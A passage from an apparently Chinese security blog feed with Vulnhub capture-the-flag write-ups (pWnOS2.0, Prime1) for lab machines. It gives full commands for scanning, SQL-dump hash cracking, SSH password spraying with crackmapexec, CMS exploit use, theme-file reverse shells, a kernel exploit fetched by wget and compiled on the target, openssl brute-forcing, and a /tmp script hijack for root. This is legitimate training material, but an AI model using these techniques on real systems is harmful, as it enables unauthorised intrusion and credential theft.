--dump</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405051808235.png" alt="image-20240505180801186"></p><h2 id="数据处理-密码喷洒登录ssh"><a href="#数据处理-密码喷洒登录ssh" class="headerlink" title="数据处理 密码喷洒登录ssh"></a>数据处理 密码喷洒登录ssh</h2><ul><li>把sqlmap保存下来的数据处理</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /home/but/.local/share/sqlmap/output/192.168.144.128/dump/website/users.csv | awk -F &#x27;,&#x27; &#123;&#x27;print $2&#x27;&#125; | awk -F &#x27; &#x27; &#123;&#x27;print $1&#x27;&#125; &gt; /home/but/Desktop/passen.lst  (取得密文的部分)</span><br><span class="line">hashcat -a 0 -m 0 passen.lst /usr/share/wordlists/rockyou.txt   (md5破解)</span><br><span class="line">cat passworded.txt  | awk -F &#x27;:&#x27; &#123;&#x27;print $2&#x27;&#125; &gt; username.lst  (获得解密之后的明文)</span><br></pre></td></tr></table></figure><ul><li>知道账号和密码之后，其实我们可以直接尝试ssh登录，但有这么多账号，如果用户名和密码不对应的话手动尝试很费劲（其实这里是对应的，完全可以直接登录，这里只是为了介绍学到的知识点），我们可以试试使用密码喷射的脚本crackmapexec</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ssh 192.168.144.128 -u usrname1.lst -p pawd.lst --continue-on-success | grep &#x27;+&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405061638206.png" alt="image-20240506163852145"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405061641497.png" alt="image-20240506164145444"></p><h1 id="简单提权"><a href="#简单提权" class="headerlink" title="简单提权"></a>简单提权</h1><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405061643290.png" alt="image-20240506164304230"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当一条路走不通,就是反弹shell之后得到的交互不完整可以连接不了数据库,所以我们需要另外一条路就直接用sqlmap拿数据,还有这道题新的知识点是ssh密码喷洒</p>]]></content>
      
      
      <categories>
          
          <category> 靶场-Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub_pWnOS2.0</title>
      <link href="/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/pWnOS2.0/"/>
      <url>/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/pWnOS2.0/</url>
      
        <content type="html"><![CDATA[<h1 align ="center">pWnOS2.0</h1><hr><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 10.10.10.0/24</span><br><span class="line">nmap --min-rate 10000 -p- 10.10.10.100</span><br><span class="line">nmap -sT -sV -O -p22,80 10.10.10.100 </span><br><span class="line">nmap -sU --min-rate 10000 -p- 10.10.10.100</span><br><span class="line">nmap --script=vuln -p22,80 10.10.10.100</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050023984.png" alt="image-20240505002330857"></p><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="网站cms利用"><a href="#网站cms利用" class="headerlink" title="网站cms利用"></a>网站cms利用</h2><ul><li>通过返回的信息，访问<code>/blog</code>页面的时候我们应该有所警觉,可能是某个cms可以利用.</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050030347.png" alt="image-20240505003007225"></p><ul><li>通过查看网页源码或者利用工具我们查看是<code>PHP Blog 0.4.0</code>cms</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://10.10.10.100/blog/ </span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050031442.png" alt="image-20240505003144327"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050032401.png" alt="image-20240505003245358"></p><ul><li>使用<code>searchsploit</code>查看cms的历史漏洞</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Simple PHP Blog 0.4.0</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050038316.png" alt="image-20240505003800276"></p><ul><li>查看脚本并且使用</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Simple PHP Blog 0.4.0 -m php/webapps/1191.pl</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050042390.png" alt="image-20240505004207329"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libswitch-perl 下载perl依赖</span><br><span class="line">perl 1191.pl -h http://10.10.10.100/blog -e 2  运行脚本</span><br></pre></td></tr></table></figure><p>得到的md5无法破解</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050045892.png" alt="image-20240505004519841"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl 1191.pl -h http://10.10.10.100/blog -e 3 -U but -P but 创建用户</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050047813.png" alt="image-20240505004719764"></p><p>成功登录</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050053251.png" alt="image-20240505005339117"></p><ul><li>进入后台就是找一下有没有文件上传的地方,并且查看文件上传路径.我们可以在images上传文件并且通过<code>dirb</code>目录爆破找到文件目录的地方,反弹shell</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050101643.png" alt="image-20240505010144581"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050105163.png" alt="image-20240505010502092"></p><h2 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h2><ul><li>抓密码发现数据库是由bash权限的,去根目录找数据库的配置文件</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050118597.png" alt="image-20240505011816536"></p><ul><li>密码错误,但是确实存在这个命名的数据库配置文件所以我们换个思路,直接文件搜索一下有没有一样名字的文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &#x27;mysqli_connect.php&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050128760.png" alt="image-20240505012825712"></p><ul><li>利用找到的文件连接数据库,要用python建立一个好一点的交互,不然连不上</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">mysql -uroot -proot@ISIntS</span><br></pre></td></tr></table></figure><ul><li>查看数据库信息</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050131826.png"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050132208.png" alt="image-20240505013237158"></p><h2 id="ssh登录提权"><a href="#ssh登录提权" class="headerlink" title="ssh登录提权"></a>ssh登录提权</h2><ul><li>虽然说得到了dan的账号以及密码，但是最后登录的ssh账号密码居然是之前连接数据库的账号密码</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405050135780.png" alt="image-20240505013540743"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>运维人员和后台管理员完全有可能为了图方便而将数据库与ssh的密码设置为相同，警醒我们要有安全意识，不要多个账号都设置相同的密码。从渗透的角度来讲，也起始我们可以进行密码碰撞。当然，在我们发现sql注入点的地方，也可以进行post注入，上传shell等，可以手工注入也可以sqlmap一把梭</p>]]></content>
      
      
      <categories>
          
          <category> 靶场-Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub_Prime1</title>
      <link href="/2024/04/22/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/prime_1/"/>
      <url>/2024/04/22/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/prime_1/</url>
      
        <content type="html"><![CDATA[<h1 align ="center">Prime 1</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-namp扫描"><a href="#1-namp扫描" class="headerlink" title="1.namp扫描"></a>1.namp扫描</h2><h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.144.0/24</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160029112.png" alt="image-20240416002900036"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -min-rate 10000 -p- 192.168.144.131</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现开放了22和80端口</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160029493.png" alt="image-20240416002935434"></p><h3 id="TCP-UDP扫描"><a href="#TCP-UDP扫描" class="headerlink" title="TCP,UDP扫描"></a>TCP,UDP扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p22,80 192.168.144.131</span><br><span class="line">-sV 对端口上的服务程序版本进行扫描</span><br><span class="line">-O 对目标主机的操作系统进行扫描</span><br><span class="line">-sT TCP连接扫描</span><br><span class="line"></span><br><span class="line">sudo nmap -sU -p22,80 192.168.144.131</span><br><span class="line">-sU 对UDP进行扫描</span><br></pre></td></tr></table></figure><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160036713.png" alt="image-20240416003619656" style="zoom:50%;" /><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160036094.png" alt="image-20240416003627060" style="zoom:50%;" /><h3 id="脚本漏洞扫描，为我们渗透提供初步思路"><a href="#脚本漏洞扫描，为我们渗透提供初步思路" class="headerlink" title="脚本漏洞扫描，为我们渗透提供初步思路"></a>脚本漏洞扫描，为我们渗透提供初步思路</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script=vuln -p22,80 192.168.144.131</span><br></pre></td></tr></table></figure><p>得到了一个cve以及一个wordpress网站的登陆页</p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160046864.png" alt="image-20240416004617795" style="zoom:50%;" /><h1 id="WEB端攻击"><a href="#WEB端攻击" class="headerlink" title="WEB端攻击"></a>WEB端攻击</h1><ul><li>访问80端口并没有什么有用信息，于是进行FUZZ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.144.131 -o DirbReport.txt</span><br></pre></td></tr></table></figure><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160100528.png" alt="image-20240416010024433" style="zoom:50%;" /><ul><li>查看dev文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.144.131/dev</span><br></pre></td></tr></table></figure><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160101883.png" alt="image-20240416010151831" style="zoom:50%;" /><ul><li>限定扩展名，特定搜索,因为很多有信息的文件可能是txt,html,ph 或者zip</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dirb http://192.168.144.131 -X .txt,.php,.html</span><br></pre></td></tr></table></figure><p>发现了secret文件</p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160104483.png" alt="image-20240416010420435" style="zoom:50%;" /><p>访问secret文件，其中比较重要的是<code>https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web看到location.txt，你就会得到你的下一步行动</code></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160105237.png" alt="image-20240416010513194"></p><ul><li>接着使用提示到得wfuzz工具对PHP文件进行FUZZ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hh 136 http://192.168.144.131/index.php?FUZZ=</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161145749.png" alt="image-20240416114558671"></p><ul><li>找到参数file，但我们并没有找到location.txt文件，所有我们可以尝试文件包含location.txt文件</li></ul><p>回显是<code>在其他一些 php 页面上使用“secrettier360”参数以获得更多乐趣</code></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161147416.png" alt="image-20240416114753356"></p><ul><li>在image.php页面上访问参数&#96;&#96;secrettier360&#96;</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161151671.png" alt="image-20240416115151626"></p><ul><li>到这一步知道了参数可以尝试使用文件包含</li></ul><p>其中知道了1.victor用户用于bash  2.saket在他的目录下可以发现password文件</p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161156830.png" alt="image-20240416115611754" style="zoom:50%;" /><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161157302.png" alt="image-20240416115749270"></p><ul><li>既然知道了saket的路劲直接访问读取密码—follow_the_ippsec</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161204110.png" alt="image-20240416120412058"></p><ul><li>尝试使用账号密码登录ssh以及WordPress后台</li></ul><p>ssh登录失败</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161211057.png" alt="image-20240416121123006"></p><p>使用saket用户后台登录失败，但是使用victor用户成功</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161213786.png" alt="image-20240416121344723"></p><img src="C:\Users\But\AppData\Roaming\Typora\typora-user-images\image-20240416135416751.png" alt="image-20240416135416751" style="zoom: 50%;" /><ul><li>接着在后台的wordpress寻找突破口，尝试上传文件，找一个个功能点以及接口，看看有没有文件上传或者可写的地方</li></ul><p>写入一句话反弹shell，刷新使用主题的路径<code>http://192.168.144.131/wordpress/wp-content/themes/twentynineteen/secret.php</code>触犯一句话</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161407101.png" alt="image-20240416140711025"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161410871.png" alt="image-20240416141013834"></p><h2 id="主机提权-解法一内核提权"><a href="#主机提权-解法一内核提权" class="headerlink" title="主机提权(解法一内核提权)"></a>主机提权(解法一内核提权)</h2><ul><li>查看主机权限,信息收集</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">whoami</span><br><span class="line">uname -a uname命令：主要用于输出一组操作系统的信息</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161415174.png" alt="image-20240416141520074"></p><ul><li>内核版本比较低,查看看看有没有漏洞提权使用searchsploit工具</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Linux ubuntu 4.10.0-28</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161418437.png" alt="image-20240416141829398"></p><ul><li>利用历史漏洞尝试提权</li></ul><p>利用第二个方法提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Linux ubuntu -m 45010</span><br></pre></td></tr></table></figure><p>这个文件是一个C语言编写的文件需要C语言编译</p><p><em>注意:由于不同环境gcc编译后的文件是不同的，这里我们应该把45010.c上传到靶机环境中再在靶机中进行编译。如果靶机中没有gcc，那再考虑搭建靶机环境，或者本地编译再上传</em></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161432274.png" alt="image-20240416143258222"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161434413.png" alt="image-20240416143405314"></p><p>本地起一个http服务,让目标机器wegt这个.c文件然后再编译(先上传到服务器再编译)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0:80</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161437219.png" alt="image-20240416143723153"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.144.132/45010.c</span><br></pre></td></tr></table></figure><p>发现当前目录是没有写入的权限的</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161443460.png" alt="image-20240416144319419"></p><p>查看哪个目录有写入权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lish</span><br></pre></td></tr></table></figure><p>发现tmp文件夹有写入权限</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161446193.png" alt="image-20240416144643110"></p><p>进入tmp目录再wget下来.c文件然后编译</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161450169.png" alt="image-20240416145003118"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.尝试编译</span><br><span class="line"> </span><br><span class="line">gcc 45010.c -o getRoot</span><br><span class="line"> </span><br><span class="line">2.添加执行权限</span><br><span class="line"> </span><br><span class="line">chmod +x getRoot</span><br><span class="line"> </span><br><span class="line">3.运行</span><br><span class="line"></span><br><span class="line">./getRoot </span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161501742.png" alt="image-20240416150113680"></p><p>提权成功，但表示完整的交互，看看是否有python,并且使用python完善交互环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l 看看有什么软件包</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161503163.png" alt="image-20240416150356069"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161507438.png" alt="image-20240416150754392"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161506045.png" alt="image-20240416150647011"></p><p>靶机基本拿下了</p><h2 id="主机提权（方法二OpenSSL解密）"><a href="#主机提权（方法二OpenSSL解密）" class="headerlink" title="主机提权（方法二OpenSSL解密）"></a>主机提权（方法二OpenSSL解密）</h2><blockquote><p>sudo -l 查看当前用户有哪些权限，发现当前用户能不用root 密码运行<a href="https://so.csdn.net/so/search?q=enc&spm=1001.2101.3001.7020">enc</a>文件，看见enc文件猜测存在openssl加密</p></blockquote><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161928423.png" alt="image-20240416192816338"></p><h3 id="ENC探索和查找"><a href="#ENC探索和查找" class="headerlink" title="ENC探索和查找"></a>ENC探索和查找</h3><p>发现是一个可执行文件,但是密码目前不知道</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161931868.png" alt="image-20240416193151819"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161933917.png" alt="image-20240416193337861"></p><ul><li>查找密码,查找备份文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*backup*&quot;</span><br><span class="line">find / -name “*passwd*”</span><br><span class="line">find / -name “*password*”</span><br><span class="line">find / -name &quot;*backup*&quot;  2&gt;/dev/null</span><br><span class="line">find / -name &quot;*backup*&quot;  2&gt;/dev/null | sort | less</span><br><span class="line">(有很多信息，其中大部分都是Permission denied 这是报错Permission denied（权限不允许），这种信息是没意义的，干脆把他丢弃掉，用2&gt;/dev/null过滤：)</span><br></pre></td></tr></table></figure><p>会返回很多信息其中找到几个比较有价值的,排除掉再help目录或者modlues目录下面的.例如&#x2F;opt&#x2F;backup,&#x2F;opt&#x2F;back&#x2F;server_database&#x2F;backup_pass等等</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161940373.png" alt="image-20240416194013265"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161940182.png" alt="image-20240416194052097"></p><p>查看这几个可疑文件,找到关键信息</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161943365.png" alt="image-20240416194349317"></p><p>运行enc文件之后得到了几个新的东西</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161947164.png" alt="image-20240416194706103"></p><ul><li>enc破解利用</li></ul><p>得到一个密文和一个密钥,其中根据提示我们可以知道md5的密钥</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161948613.png" alt="image-20240416194855549"></p><ul><li>加密MD5</li></ul><p>接下来md5加密得到密钥,这里一个小细节就是MD5加密的时候要使用-n参数,因为在终端用echo输出会再后面加一个&#x2F;n字符,我们需要去掉.awk是对字符串进行处理的一个工具，<code>awk -F &#39; &#39; &#39;&#123;print $1;&#125;&#39;</code>意思是以空格为分割，打印其中第一个部分，这样就会只输出366a74cb3c959de17d61db30591c39d1 后面的‘-’不会输出 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;ippsec&#x27; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1;&#125;&#x27;</span><br></pre></td></tr></table></figure><ul><li>openssl破解</li></ul><p>openssl enc的使用,现在需要密文,密钥,加解密方式,加解密方式是不知道的.我们只是大概知道可能是base64加密,另外-k参数输入密钥需要16进制的形式</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162020058.png" alt="image-20240416201722016"></p><p>先处理k参数输入16进制的参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;ippsec&quot; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1;&#125;&#x27; | od -A n -t x1(这个命令会存在后面带一个oa)</span><br><span class="line">使用tr –d  ‘\n’去掉换行符 </span><br><span class="line">echo -n &quot;ippsec&quot; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1;&#125;&#x27; |tr -d &#x27;\n&#x27;| od -A n -t x1 | tr -d  &#x27; &#x27; | tr -d  &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162043244.png" alt="image-20240416204305186"></p><p>处理解密方式,因为有很多解密的方式我们需要遍历,利用bash命令实现对其的遍历</p><p>首先是把所有的方法都保存在CipherTypeRaw文件里面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;&#123;gsub(/ /,&quot;\n&quot;);print&#125;&#x27; CipherTypeRaw | sort | uniq &gt; CipherTypes</span><br><span class="line">加上sort是让每一行变得紧密,uniq每行的重复字符删去(删除多余的换行)</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162108053.png" alt="image-20240416210839976"></p><p>使用bash命令遍历</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for cipher in $(cat CipherTypes);do echo &quot;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&quot; | openssl enc -d -a -$cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2&gt;/dev/null;echo $cipher;done</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到的是aes-256-ecb加密,密码是”tribute_to_ippsec”,还有一个Victor的落款</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162127587.png" alt="image-20240416212735508"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162128353.png" alt="image-20240416212855286"></p><ul><li>ssh连接提权</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162137965.png" alt="image-20240416213716870"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162138882.png" alt="image-20240416213826831"></p><p>按照提示运行相关文件,发现缺少challenge,按照提示来</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162139357.png" alt="image-20240416213905304"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162143044.png" alt="image-20240416214315930"></p><p>以root运行&#x2F;home&#x2F;victor&#x2F;undefeated_victor会去运行&#x2F;tmp&#x2F;challenge，如果challenge中包含提权的指令，那么一旦运行就可以提权了，没有这个challenge文件，那咱就创建一个，tmp文件也可以写入文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;#!/bin/bash&#x27; &gt; challenge</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; challenge </span><br><span class="line">chmod +x challenge </span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162147499.png" alt="image-20240416214704448"></p><p>提权成功!</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>前期先信息收集,这个靶机重点是在于信息挖掘,对于目录的fuzz,接着是对于wordpress后台的getshell,然后方法一通过内核版本过低进行提权,方法二是获取openssl的账号密码进行提权.重点是2.openssl解密：1密文；2密钥；3加密算法 缺一不可4.awk,md5sum,od,tr等字符串处理命令4.bash脚本</p>]]></content>
      
      
      <categories>
          
          <category> 靶场-Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>portswigger_ssrf</title>
      <link href="/2024/02/02/%E9%9D%B6%E5%9C%BA/portswigger/SSRF/"/>
